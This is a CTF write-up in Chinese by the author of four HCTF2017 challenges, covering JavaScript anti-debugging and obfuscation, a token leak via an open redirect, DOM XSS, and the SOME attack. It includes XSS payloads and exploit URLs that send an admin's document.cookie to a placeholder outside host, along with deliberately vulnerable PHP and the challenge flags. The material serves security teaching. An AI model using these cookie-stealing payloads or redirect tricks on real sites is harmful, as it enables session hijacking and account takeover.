作者：LoRexxar'@知道创宇404实验室

11月12日结束的HCTF2017，我总共出了其中4道题目，这4道题目涵盖了我这半年来接触的很多有趣的东西。下面就简单讲讲出题思路以及完整的Writeup。

    
    
    babycrack
    
    Description 
    just babycrack
    1.flag.substr(-5,3)=="333"
    2.flag.substr(-8,1)=="3"
    3.Every word makes sence.
    4.sha256(flag)=="d3f154b641251e319855a73b010309a168a12927f3873c97d2e5163ea5cbb443" 
    
    Now Score 302.93
    Team solved 45
    
    
    A World Restored
    Description:
    nothing here or all the here ps:flag in admin cookie 
    flag is login as admin
    Now Score 674.44
    Team solved 7
    
    
    A World Restored Again
    Description: 
    New Challenge !! 
    hint: flag only from admin bot
    Now Score 702.6
    Team solved 6
    
    Deserted place
    Description 
    maybe nothing here 
    flag in admin cookie
    Now Score 820.35
    Team solved 3

  * babycrack是一道前端js的题目，包含了反调试、代码混淆、逻辑混淆3步。
  * A world Restored比较有趣，是一个站库分离的站点。有两个漏洞，一个比较像中间人的信息泄露，另一个是dom xss。
  * Deserted place是一个比较古老的技术，叫做SOME，但是了解细节的人非常少。

#### babycrack

还是很抱歉题目的验证逻辑还是出现了不可逆推的问题，被迫在比赛中途加入4个hint来修复问题，下面我们来慢慢看看代码。

题目源码如下 <https://github.com/LoRexxar/HCTF2017-babycrack>

整个题目由反调试+代码混淆+逻辑混淆3部分组成，你可以说题目毫无意义完全为了出题而出题，但是这种代码确实最最真实的前端代码，现在许多站点都会选择使用反调试+混淆+一定程度的代码混淆来混淆部分前端代码。

出题思路主要有两篇文章：

  * <http://www.jianshu.com/p/9148d215c119>
  * <https://zhuanlan.zhihu.com/p/29214928>

整个题目主要是在我分析chrome拓展后门时候构思的，代码同样经过了很多重的混淆，让我们来一步步解释。

##### 反调试

第一部分是反调试，当在页面内使用F12来调试代码时，会卡死在debugger代码处。
![](https://images.seebug.org/content/images/2017/11/2361c8c3-dba9-40a8-8753-5fc0dc67585d.png-w331s)

这里举个例子就是蘑菇街的登陆验证代码。
![](https://images.seebug.org/content/images/2017/11/f81077f0-c399-4d44-a987-d877dd94da3d.png-w331s)

具体代码是这样的

    
    
    eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('(3(){(3 a(){7{(3 b(2){9((\'\'+(2/2)).5!==1||2%g===0){(3(){}).8(\'4\')()}c{4}b(++2)})(0)}d(e){f(a,6)}})()})();',17,17,'||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20'.split('|'),0,{}));

美化一下

    
    
    (function () {
        (function a() {
            try {
                (function b(i) {
                    if (('' + (i / i)).length !== 1 || i % 20 === 0) {
                        (function () {}).constructor('debugger')()
                    } else {
                        debugger
                    }
                    b(++i)
                })(0)
            } catch (e) {
                setTimeout(a, 5000)
            }
        })()
    })();

这就是比较常见的反调试。我这里提供3种办法来解决这步。

1、使用node做代码调试。

由于这里的debugger检测的是浏览器的调试，如果直接对代码调试就不会触发这样的问题。

2、静态分析

因为题目中代码较少，我没办法把代码混入深层逻辑，导致代码可以纯静态分析。

3、patch debugger函数

由于debugger本身只会触发一次，不会无限制的卡死调试器，这里会出现这种情况，主要是每5s轮询检查一次。那么我们就可以通过patch
settimeout函数来绕过。

    
    
    window._setTimeout = window.setTimeout;
    window.setTimeout = function () {};

这里可以用浏览器插件TamperMonkey解决问题。

除了卡死debug以外，我还加入了轮询刷新console的代码。

    
    
    setInterval("window.console.log('Welcome to HCTF :>')", 50);

同样的办法可以解决，就不多说了。

##### 代码混淆

在去除掉这部分无用代码之后，我们接着想办法去除代码混淆。

这里最外层的代码混淆，我是通过<https://github.com/javascript-obfuscator/javascript-obfuscator>做了混淆。

ps:因为我在代码里加入了es6语法，市面上的很多工具都不支持es6语法，会导致去混淆的代码语法错误！

更有趣的是，这种混淆是不可逆的，所以我们只能通过逐渐去混淆的方式来美化代码。

我们可以先简单美化一下代码格式

    
    
    (function (_0xd4b7d6, _0xad25ab) {
        var _0x5e3956 = function (_0x1661d3) {
            while (--_0x1661d3) {
                _0xd4b7d6['push'](_0xd4b7d6['shift']());
            }
        };
        _0x5e3956(++_0xad25ab);
    }(_0x180a, 0x1a2));
    var _0xa180 = function (_0x5c351c, _0x2046d8) {
        _0x5c351c = _0x5c351c - 0x0;
        var _0x26f3b3 = _0x180a[_0x5c351c];
        return _0x26f3b3;
    };
    
    function check(_0x5b7c0c) {
        try {
            var _0x2e2f8d = ['code', _0xa180('0x0'), _0xa180('0x1'), _0xa180('0x2'), 'invalidMonetizationCode', _0xa180('0x3'), _0xa180('0x4'), _0xa180('0x5'), _0xa180('0x6'), _0xa180('0x7'), _0xa180('0x8'), _0xa180('0x9'), _0xa180('0xa'), _0xa180('0xb'), _0xa180('0xc'), _0xa180('0xd'), _0xa180('0xe'), _0xa180('0xf'), _0xa180('0x10'), _0xa180('0x11'), 'url', _0xa180('0x12'), _0xa180('0x13'), _0xa180('0x14'), _0xa180('0x15'), _0xa180('0x16'), _0xa180('0x17'), _0xa180('0x18'), 'tabs', _0xa180('0x19'), _0xa180('0x1a'), _0xa180('0x1b'), _0xa180('0x1c'), _0xa180('0x1d'), 'replace', _0xa180('0x1e'), _0xa180('0x1f'), 'includes', _0xa180('0x20'), 'length', _0xa180('0x21'), _0xa180('0x22'), _0xa180('0x23'), _0xa180('0x24'), _0xa180('0x25'), _0xa180('0x26'), _0xa180('0x27'), _0xa180('0x28'), _0xa180('0x29'), 'toString', _0xa180('0x2a'), 'split'];
            var _0x50559f = _0x5b7c0c[_0x2e2f8d[0x5]](0x0, 0x4);
            var _0x5cea12 = parseInt(btoa(_0x50559f), 0x20);
            eval(function (_0x200db2, _0x177f13, _0x46da6f, _0x802d91, _0x2d59cf, _0x2829f2) {
                _0x2d59cf = function (_0x4be75f) {
                    return _0x4be75f['toString'](_0x177f13);
                };
                if (!'' ['replace'](/^/, String)) {
                    while (_0x46da6f--) _0x2829f2[_0x2d59cf(_0x46da6f)] = _0x802d91[_0x46da6f] || _0x2d59cf(_0x46da6f);
                    _0x802d91 = [function (_0x5e8f1a) {
                        return _0x2829f2[_0x5e8f1a];
                    }];
                    _0x2d59cf = function () {
                        return _0xa180('0x2b');
                    };
                    _0x46da6f = 0x1;
                };
                while (_0x46da6f--)
                    if (_0x802d91[_0x46da6f]) _0x200db2 = _0x200db2[_0xa180('0x2c')](new RegExp('\x5cb' + _0x2d59cf(_0x46da6f) + '\x5cb', 'g'), _0x802d91[_0x46da6f]);
                return _0x200db2;
            }(_0xa180('0x2d'), 0x11, 0x11, _0xa180('0x2e')['split']('|'), 0x0, {}));
            (function (_0x3291b7, _0xced890) {
                var _0xaed809 = function (_0x3aba26) {
                    while (--_0x3aba26) {
                        _0x3291b7[_0xa180('0x4')](_0x3291b7['shift']());
                    }
                };
                _0xaed809(++_0xced890);
            }(_0x2e2f8d, _0x5cea12 % 0x7b));
            var _0x43c8d1 = function (_0x3120e0) {
                var _0x3120e0 = parseInt(_0x3120e0, 0x10);
                var _0x3a882f = _0x2e2f8d[_0x3120e0];
                return _0x3a882f;
            };
            var _0x1c3854 = function (_0x52ba71) {
                var _0x52b956 = '0x';
                for (var _0x59c050 = 0x0; _0x59c050 < _0x52ba71[_0x43c8d1(0x8)]; _0x59c050++) {
                    _0x52b956 += _0x52ba71[_0x43c8d1('f')](_0x59c050)[_0x43c8d1(0xc)](0x10);
                }
                return _0x52b956;
            };
            var _0x76e1e8 = _0x5b7c0c[_0x43c8d1(0xe)]('_');
            var _0x34f55b = (_0x1c3854(_0x76e1e8[0x0][_0x43c8d1(0xd)](-0x2, 0x2)) ^ _0x1c3854(_0x76e1e8[0x0][_0x43c8d1(0xd)](0x4, 0x1))) % _0x76e1e8[0x0][_0x43c8d1(0x8)] == 0x5;
            if (!_0x34f55b) {
                return ![];
            }
            b2c = function (_0x3f9bc5) {
                var _0x3c3bd8 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
                var _0x4dc510 = [];
                var _0x4a199f = Math[_0xa180('0x25')](_0x3f9bc5[_0x43c8d1(0x8)] / 0x5);
                var _0x4ee491 = _0x3f9bc5[_0x43c8d1(0x8)] % 0x5;
                if (_0x4ee491 != 0x0) {
                    for (var _0x1e1753 = 0x0; _0x1e1753 < 0x5 - _0x4ee491; _0x1e1753++) {
                        _0x3f9bc5 += '';
                    }
                    _0x4a199f += 0x1;
                }
                for (_0x1e1753 = 0x0; _0x1e1753 < _0x4a199f; _0x1e1753++) {
                    _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')](_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5) >> 0x3));
                    _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')]((_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5) & 0x7) << 0x2 | _0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x1) >> 0x6));
                    _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')]((_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x1) & 0x3f) >> 0x1));
                    _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')]((_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x1) & 0x1) << 0x4 | _0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x2) >> 0x4));
                    _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')]((_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x2) & 0xf) << 0x1 | _0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x3) >> 0x7));
                    _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')]((_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x3) & 0x7f) >> 0x2));
                    _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')]((_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x3) & 0x3) << 0x3 | _0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x4) >> 0x5));
                    _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')](_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x4) & 0x1f));
                }
                var _0x545c12 = 0x0;
                if (_0x4ee491 == 0x1) _0x545c12 = 0x6;
                else if (_0x4ee491 == 0x2) _0x545c12 = 0x4;
                else if (_0x4ee491 == 0x3) _0x545c12 = 0x3;
                else if (_0x4ee491 == 0x4) _0x545c12 = 0x1;
                for (_0x1e1753 = 0x0; _0x1e1753 < _0x545c12; _0x1e1753++) _0x4dc510[_0xa180('0x2f')]();
                for (_0x1e1753 = 0x0; _0x1e1753 < _0x545c12; _0x1e1753++) _0x4dc510[_0x43c8d1('1b')]('=');
                (function () {
                    (function _0x3c3bd8() {
                        try {
                            (function _0x4dc510(_0x460a91) {
                                if (('' + _0x460a91 / _0x460a91)[_0xa180('0x30')] !== 0x1 || _0x460a91 % 0x14 === 0x0) {
                                    (function () {}['constructor']('debugger')());
                                } else {
                                    debugger;
                                }
                                _0x4dc510(++_0x460a91);
                            }(0x0));
                        } catch (_0x30f185) {
                            setTimeout(_0x3c3bd8, 0x1388);
                        }
                    }());
                }());
                return _0x4dc510[_0xa180('0x31')]('');
            };
            e = _0x1c3854(b2c(_0x76e1e8[0x2])[_0x43c8d1(0xe)]('=')[0x0]) ^ 0x53a3f32;
            if (e != 0x4b7c0a73) {
                return ![];
            }
            f = _0x1c3854(b2c(_0x76e1e8[0x3])[_0x43c8d1(0xe)]('=')[0x0]) ^ e;
            if (f != 0x4315332) {
                return ![];
            }
            n = f * e * _0x76e1e8[0x0][_0x43c8d1(0x8)];
            h = function (_0x4c466e, _0x28871) {
                var _0x3ea581 = '';
                for (var _0x2fbf7a = 0x0; _0x2fbf7a < _0x4c466e[_0x43c8d1(0x8)]; _0x2fbf7a++) {
                    _0x3ea581 += _0x28871(_0x4c466e[_0x2fbf7a]);
                }
                return _0x3ea581;
            };
            j = _0x76e1e8[0x1][_0x43c8d1(0xe)]('3');
            if (j[0x0][_0x43c8d1(0x8)] != j[0x1][_0x43c8d1(0x8)] || (_0x1c3854(j[0x0]) ^ _0x1c3854(j[0x1])) != 0x1613) {
                return ![];
            }
            k = _0xffcc52 => _0xffcc52[_0x43c8d1('f')]() * _0x76e1e8[0x1][_0x43c8d1(0x8)];
            l = h(j[0x0], k);
            if (l != 0x2f9b5072) {
                return ![];
            }
            m = _0x1c3854(_0x76e1e8[0x4][_0x43c8d1(0xd)](0x0, 0x4)) - 0x48a05362 == n % l;
    
            function _0x5a6d56(_0x5a25ab, _0x4a4483) {
                var _0x55b09f = '';
                for (var _0x508ace = 0x0; _0x508ace < _0x4a4483; _0x508ace++) {
                    _0x55b09f += _0x5a25ab;
                }
                return _0x55b09f;
            }
            if (!m || _0x5a6d56(_0x76e1e8[0x4][_0x43c8d1(0xd)](0x5, 0x1), 0x2) == _0x76e1e8[0x4][_0x43c8d1(0xd)](-0x5, 0x4) || _0x76e1e8[0x4][_0x43c8d1(0xd)](-0x2, 0x1) - _0x76e1e8[0x4][_0x43c8d1(0xd)](0x4, 0x1) != 0x1) {
                return ![];
            }
            o = _0x1c3854(_0x76e1e8[0x4][_0x43c8d1(0xd)](0x6, 0x2))[_0x43c8d1(0xd)](0x2) == _0x76e1e8[0x4][_0x43c8d1(0xd)](0x6, 0x1)[_0x43c8d1('f')]() * _0x76e1e8[0x4][_0x43c8d1(0x8)] * 0x5;
            return o && _0x76e1e8[0x4][_0x43c8d1(0xd)](0x4, 0x1) == 0x2 && _0x76e1e8[0x4][_0x43c8d1(0xd)](0x6, 0x2) == _0x5a6d56(_0x76e1e8[0x4][_0x43c8d1(0xd)](0x7, 0x1), 0x2);
        } catch (_0x4cbb89) {
            console['log']('gg');
            return ![];
        }
    }

代码里主要有几点混淆：

1、变量名替换，`a --> _0xd4b7d6`，这种东西最烦，但是也最简单，批量替换，在我看来即使abcd这种变量也比这个容易读

2、提取了所有的方法到一个数组，这种也简单，只要在chrome中逐步调试替换就可以了。

![](https://images.seebug.org/content/images/2017/11/11c2f8ac-3109-47f7-a4e1-9a66c486b2a9.png-w331s)

还有一些小的细节，很常见，没什么可说的

    
    
    "s".length()  --> "s"['length']()

最终代码可以优化到这个地步，基本已经可读了，下一步就是分析代码了。

    
    
    function check(flag){
        var _ = ['\x63\x6f\x64\x65', '\x76\x65\x72\x73\x69\x6f\x6e', '\x65\x72\x72\x6f\x72', '\x64\x6f\x77\x6e\x6c\x6f\x61\x64', '\x69\x6e\x76\x61\x6c\x69\x64\x4d\x6f\x6e\x65\x74\x69\x7a\x61\x74\x69\x6f\x6e\x43\x6f\x64\x65', '\x54\x6a\x50\x7a\x6c\x38\x63\x61\x49\x34\x31', '\x4b\x49\x31\x30\x77\x54\x77\x77\x76\x46\x37', '\x46\x75\x6e\x63\x74\x69\x6f\x6e', '\x72\x75\x6e', '\x69\x64\x6c\x65', '\x70\x79\x57\x35\x46\x31\x55\x34\x33\x56\x49', '\x69\x6e\x69\x74', '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x68\x65\x2d\x65\x78\x74\x65\x6e\x73\x69\x6f\x6e\x2e\x63\x6f\x6d', '\x6c\x6f\x63\x61\x6c', '\x73\x74\x6f\x72\x61\x67\x65', '\x65\x76\x61\x6c', '\x74\x68\x65\x6e', '\x67\x65\x74', '\x67\x65\x74\x54\x69\x6d\x65', '\x73\x65\x74\x55\x54\x43\x48\x6f\x75\x72\x73', '\x75\x72\x6c', '\x6f\x72\x69\x67\x69\x6e', '\x73\x65\x74', '\x47\x45\x54', '\x6c\x6f\x61\x64\x69\x6e\x67', '\x73\x74\x61\x74\x75\x73', '\x72\x65\x6d\x6f\x76\x65\x4c\x69\x73\x74\x65\x6e\x65\x72', '\x6f\x6e\x55\x70\x64\x61\x74\x65\x64', '\x74\x61\x62\x73', '\x63\x61\x6c\x6c\x65\x65', '\x61\x64\x64\x4c\x69\x73\x74\x65\x6e\x65\x72', '\x6f\x6e\x4d\x65\x73\x73\x61\x67\x65', '\x72\x75\x6e\x74\x69\x6d\x65', '\x65\x78\x65\x63\x75\x74\x65\x53\x63\x72\x69\x70\x74', '\x72\x65\x70\x6c\x61\x63\x65', '\x64\x61\x74\x61', '\x74\x65\x73\x74', '\x69\x6e\x63\x6c\x75\x64\x65\x73', '\x68\x74\x74\x70\x3a\x2f\x2f', '\x6c\x65\x6e\x67\x74\x68', '\x55\x72\x6c\x20\x65\x72\x72\x6f\x72', '\x71\x75\x65\x72\x79', '\x66\x69\x6c\x74\x65\x72', '\x61\x63\x74\x69\x76\x65', '\x66\x6c\x6f\x6f\x72', '\x72\x61\x6e\x64\x6f\x6d', '\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74', '\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65', '\x70\x61\x72\x73\x65'];
    
        var head = flag['substring'](0, 4);
        var base = parseInt(btoa(head), 0x20); //344800
    
    
        (function (b, c) {
            var d = function (a) {
                    while (--a) {
                        b['push'](b['shift']())
                    }
                };
            d(++c);
        }(_, base%123));
    
        var g = function (a) {
                var a = parseInt(a, 0x10);
                var c = _[a];
                return c;
            };
    
        var s2h = function(str){
            var result = "0x";
            for(var i=0;i<str['length'];i++){
                result += str['charCodeAt'](i)['toString'](16)
            }
            return result;
        }
    
        var b = flag['split']("_");
        var c = (s2h(b[0]['substr'](-2,2)) ^ s2h(b[0]['substr'](4,1))) % b[0]['length'] == 5;
        if(!c){
            return false;
        }
    
        b2c = function(s) {
        var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    
        var parts = [];
        var quanta = Math.floor((s['length'] / 5));
        var leftover = s['length'] % 5;
    
        if (leftover != 0) {
            for (var i = 0; i < (5 - leftover); i++) {
                s += '\x00';
            }
            quanta += 1;
        }
    
        for (i = 0; i < quanta; i++) {
            parts.push(alphabet.charAt(s['charCodeAt'](i * 5) >> 3));
            parts.push(alphabet.charAt(((s['charCodeAt'](i * 5) & 0x07) << 2) | (s['charCodeAt'](i * 5 + 1) >> 6)));
            parts.push(alphabet.charAt(((s['charCodeAt'](i * 5 + 1) & 0x3F) >> 1)));
            parts.push(alphabet.charAt(((s['charCodeAt'](i * 5 + 1) & 0x01) << 4) | (s['charCodeAt'](i * 5 + 2) >> 4)));
            parts.push(alphabet.charAt(((s['charCodeAt'](i * 5 + 2) & 0x0F) << 1) | (s['charCodeAt'](i * 5 + 3) >> 7)));
            parts.push(alphabet.charAt(((s['charCodeAt'](i * 5 + 3) & 0x7F) >> 2)));
            parts.push(alphabet.charAt(((s['charCodeAt'](i * 5 + 3) & 0x03) << 3) | (s['charCodeAt'](i * 5 + 4) >> 5)));
            parts.push(alphabet.charAt(((s['charCodeAt'](i * 5 + 4) & 0x1F))));
        }
    
        var replace = 0;
        if (leftover == 1)
            replace = 6;
        else if (leftover == 2)
            replace = 4;
        else if (leftover == 3)
            replace = 3;
        else if (leftover == 4)
            replace = 1;
    
        for (i = 0; i < replace; i++)
            parts.pop();
        for (i = 0; i < replace; i++)
            parts.push("=");
    
        return parts.join("");
        }
    
        e = s2h(b2c(b[2])['split']("=")[0])^0x53a3f32
        if(e != 0x4b7c0a73){
            return false;
        }
    
        f = s2h(b2c(b[3])['split']("=")[0]) ^ e;
        if(f != 0x4315332){
            return false;
        }
    
        n = f*e*b[0]['length'];
    
        h = function(str, func){
            var result = "";
            for(var i=0;i<str['length'];i++){
                result += func(str[i])
            }
            return result;
        }
    
        j = b[1]['split']("3");
        if(j[0]['length'] != j[1]['length'] || (s2h(j[0])^s2h(j[1])) != 0x1613){
            return false;
        }
    
        k = str => str['charCodeAt']()*b[1]['length'];
    
        l = h(j[0],k);
        if(l!=0x2f9b5072){
            return false;
        }
    
        m = s2h(b[4]['substr'](0,4))-0x48a05362 == n%l;
    
        function u(str, j){
            var result = "";
            for(var i=0;i<j;i++){
                result += str;
            }
            return result;
        }
    
        if(!m || u(b[4]['substr'](5,1),2) == b[4]['substr'](-5,4) || (b[4]['substr'](-2,1) - b[4]['substr'](4,1)) != 1){
            return false
        }
    
        o = s2h(b[4]['substr'](6,2))['substr'](2) == b[4]['substr'](6,1)['charCodeAt']()*b[4]['length']*5;
    
        return o && b[4]['substr'](4,1) == 2 && b[4]['substr'](6,2) == u(b[4]['substr'](7,1),2);
    }

剩下的代码已经没什么可说的了。

  1. 首先是确认flag前缀，然后按照`_`分割为5部分。
  2. g函数对基础数组做了一些处理，已经没什么懂了。
  3. s2h是字符串到hex的转化函数
  4. 第一部分的验证不完整，导致严重的多解，只能通过爆破是否符合sha256来解决。
  5. 后面引入的b2c函数很简单，测试就能发现是一个base32函数。
  6. 第三部分和第四部分最简单，异或可得
  7. h函数会对输入的字符串每位做func函数处理，然后拼接起来。
  8. 第二部分由3分割，左右两边长度相等，同样可以推算出结果。
  9. k是我专门加入的es6语法的箭头语法，对传入的每个字母做乘7操作。
  10. 最后一题通过简单的判断，可以确定最后一部分的前四位。
  11. u函数返回指定字符串的指定前几位
  12. 剩下的就是一连串的条件:
  13. 首先是一些很关键的的重复位，由于我写错了一些东西，导致这里永远是false，后被迫给出这几位.`!m || u(b[4]['substr'](5,1),2) == b[4]['substr'](-5,4) || (b[4]['substr'](-2,1) - b[4]['substr'](4,1)) != 1`
  14. 最后一部分是集合长度、以及部分条件完成的，看上去存在多解，但事实上是能逆向出来结果的。

当我们都完成这部分的时候，flag就会被我们解出来了。

#### A World Restored

题目源码如下： <https://github.com/LoRexxar/HCTF2017-A-World-Restored>

A World Restored在出题思路本身是来自于uber在10月14号公开的一个漏洞<https://stamone-bug-bounty.blogspot.jp/2017/10/dom-xss-auth_14.html>，为了能尽可能的模拟真实环境，我这个不专业的Web开发只能强行上手实现站库分离。

其中的一部分非预期，也都是因为站库分离实现的不好而导致的。（更开放的题目环境，导致了很多可能，或许这没什么不好的？

整个站的结构是这样的：

  1. auth站负责用户数据的处理，包括登陆验证、注册等，是数据库所在站。
  2. messbox站负责用户的各种操作，但不连接数据库。

这里auth站与messbox站属于两个完全不同的域，受到 **同源策略** 的影响，我们就需要有办法来沟通两个站。

而这里，我选择使用token做用户登陆的校验+jsonp来获取用户数据。站点结构如下:

![](https://images.seebug.org/content/images/2017/11/b9039c0c-2879-484f-9818-571850984fd9.png-w331s)

简单来说就是，messbox登陆账号完全受到token校验，即使你在完全不知道账号密码的情况下，获取该token就可以登陆账号。

那么怎么获取token登陆admin账号就是第一题。

而第二题，漏洞点就是上面文章中写的那样，反射性的domxss，可以得到服务端的flag。

为了两个flag互不干扰，我对服务端做了一定的处理，服务端负责处理flag的代码如下：

    
    
    $flag1 = "hctf{xs5_iz_re4lly_complex34e29f}";
    $flag2 = "hctf{mayb3_m0re_way_iz_best_for_ctf}";
    
    if(!empty($_SESSION['user'])){
        if($_SESSION['user'] === 'hctf_admin_LoRexxar2e23322'){
                    setcookie("flag", $flag, time()+3600*48," ","messbox.2017.hctf.io", 0, true);
            }
    
        if($_SESSION['user'] === 'hctf_admin_LoRexxar2e23322' && $_GET['check']=="233e"){
            setcookie("flag2", $flag2, time()+3600*48," ",".2017.hctf.io");
        }
    }

可以很明显的看出来，flag1是httponly并在messbox域下，只能登陆才能查看。flag2我设置了check位，只有bot才会访问这个页面，这样只有通过反射性xss，才能得到flag。

下面我们回到题目。

##### A World Restored

    
    
    A World Restored
    Description:
    nothing here or all the here ps:flag in admin cookie 
    flag is login as admin
    URL http://messbox.2017.hctf.io
    Now Score 674.44
    Team solved 7

这道题目在比赛结束时，只有7只队伍最终完成了，非常出乎我的意料，因为漏洞本身非常有意思。（这个漏洞是ROIS发现的）

为了能够实现token，我设定了token不可逆的二重验证策略，但是在题目中我加入了一个特殊的接口，让我们回顾一下。

auth域中的login.php，我加入了这样一段代码

    
    
    if(!empty($_GET['n_url'])){
            $n_url = trim($_GET['n_url']);
            echo "<script nonce='{$random}'>window.location.href='".$n_url."?token=".$usertoken."'</script>";
            exit;
        }else{
            // header("location: http://messbox.hctf.com?token=".$usertoken);
            echo "<script nonce='{$random}'>window.location.href='http://messbox.2017.hctf.io?token=".$usertoken."'</script>";
            exit;
        }

这段代码也是两个漏洞的核心漏洞点，假设你在未登录状态下访问messbox域下的user.php或者report.php这两个页面，那么因为未登录，页面会跳转到auth域并携带n_url，如果获取到登陆状态，这里就会拼接token传回messbox域，并赋予登陆状态。

简单的流程如下：

    
    
    未登录->获取当前URL->跳转至auth->获取登陆状态->携带token跳转到刚才获取的URL->messbox登陆成功

当然，这其中是有漏洞的。

服务端bot必然登陆了admin账号，如果我们直接请求login.php并制定下一步跳转的URL，那么我们就可以获取拼接上的token！

    
    
    poc
    
    http://auth.2017.hctf.io/login.php?n_url=http://{you_website}

得到token我们就可以登陆messbox域，成功登陆admin

##### A World Restored Again

    
    
    A World Restored Again
    Description: 
    New Challenge !! 
    hint: flag only from admin bot
    URL http://messbox.2017.hctf.io
    Now Score 702.6
    Team solved 6

到了第二部，自然就是xss了，其实题目本身非常简单，在出题之初，为了避免题目出现“垃圾时间”（因为非预期导致题目不可解），我在题目中加入了跟多元素。

并把flag2放置在`.2017.hctf.io`域下，避免有人找到messbox的xss但是打不到flag的问题。（没想到真的用上了）

这里我就简单描述下预期解法和非预期解法两个。

###### 预期解法

预期解法当然来自于出题思路。

<https://stamone-bug-bounty.blogspot.jp/2017/10/dom-xss-auth_14.html>

漏洞本身非常简单，但有意思的是利用思路。

**当你发现了一个任意URL跳转的漏洞，会不会考虑漏洞是怎么发生的？**

也许你平时可能没注意过，但跳转一般是分两种的，第一种是服务端做的，利用`header:
location`,这种跳转我们没办法阻止。第二种是js使用`location.href`导致的跳转。

既然是js实现的，那么是不是有可能存在dom xss漏洞呢？

这个uber的漏洞由来就是如此。

这里唯一的考点就是，js是一种顺序执行的语言，如果location报错，那么就不会继续执行后面的js，如果location不报错，那么就可能在执行下一句之前跳转走。

当然，办法很多。最普通的可能是在location后使用`stop()`来阻止跳转，但最好用的就是新建script块，这样上一个script报错不会影响到下一个script块。

最终payload

    
    
    </script><script src="http://auth.hctf.com/getmessage.php?callback=window.location.href='http://xxx?cookie='+document.cookie;//"></script
    
    exp
    
    http://auth.2017.hctf.io/login.php?n_url=%3E%3C%2fscript%3E%3Cscript%20src%3D%22http%3A%2f%2fauth.2017.hctf.io%2fgetmessage.php%3Fcallback%3Dwindow.location.href%3D%27http%3A%2f%2fxxx%3Fcookie%3D%27%252bdocument.cookie%3B%2f%2f%22%3E%3C%2fscript%3E

###### 非预期解法

除了上面的漏洞以外，messbox也有漏洞，username在首页没有经过任何过滤就显示在了页面内。

但username这里漏洞会有一些问题，因为本身预期的漏洞点并不是这里，所以这里的username经过我框架本身的一点儿过滤，而且长度有限制，所以从这里利用的人会遇到很多非预期的问题。

payload如下，注册名为

    
    
    <script src=//auth.2017.hctf.io/getmessage.php?callback=location=%27http://xxx/%27%2bbtoa(document.cookie);//></script>

的用户名，并获取token。

传递

    
    
    http://messbox.2017.hctf.io/?token=NDYyMGZlMTNhNWM3YTAxY3xQSE5qY21sd2RDQnpjb
    U05THk5aGRYUm9Makl3TVRjdWFHTjBaaTVwYnk5blpYUnRaWE56WVdkbExuQm9jRDlqWVd4c1ltR
    mphejFzYjJOaGRHbHZiajBsTWpkb2RIUndPaTh2Y205dmRHc3VjSGN2SlRJM0pUSmlZblJ2WVNoa
    2IyTjFiV1Z1ZEM1amIyOXJhV1VwT3k4dlBqd3ZjMk55YVhCMFBnPT0=

即可

#### Deserted place

出题思路来自于一个比较特别的叫做SOME的攻击方式，全名`Same Origin Method
Execution`，这是一种2015年被人提出来的攻击方式，可以用来执行同源环境下的任意方法，2年前就有人做了分析。

  * [原paper](http://files.benhayak.com/Same_Origin_Method_Execution__paper.pdf)
  * <http://blog.safedog.cn/?p=13>
  * <https://lightless.me/archives/same-origin-method-exection.html>

题目源码如下 <https://github.com/LoRexxar/HCTF2017-Deserted-place>

我们一起来研究一下

##### SOME？

首先我们一起来探究一个SOME是什么？

SOMe,Same Origin Method Execution,这是Ben Hayak 在 Black Hat Eorope 2014
演讲的题目。在随后的15年，公开了SOME相关的完整paper，其中讲述了和SOME相关的各种场景和利用思路。有兴趣的朋友可以去看看视频.

<https://www.youtube.com/watch?v=OvarkOxxdic>

我们都知道jsonp是用来解决跨域处理数据问题的解决方案，但是也许会有这样一种情况出现，某个网站的某个富文本编辑器支持选择字体颜色，当你点击按钮的时候，会弹出类似于颜色点选器的轮盘网页，当你选择某一颜色时，这个颜色就会修改原页面的字体页面，这个接口或许是这样实现的。

    
    
    http://a.com/color.php?callback=get_color

color.php的代码是这样的

    
    
    <script>
    function get_color(data) {
        // todo here
    }
    </script>
    
    <script>
    <?php echo $_GET['callback']."();"; ?>
    </script>

当访问color.php的时候，页面就会自动执行`get_color`，这个页面和父页面同源，结构也和传统的jsonp接口不太一样，但这种情况完全有可能发生。

一般来说，我们可能会尝试在`get_color`尝试domxss，遗憾的是，大部分这样的接口都只允许`.\w+`的字符输入。

而SOME攻击，就是在这种场景下出现的，在callback这里的缺陷可以导致执行同源下的 **任意**
方法，值得注意的是，这种攻击方法并不是csrf，他可以完全模拟你的任何行为。

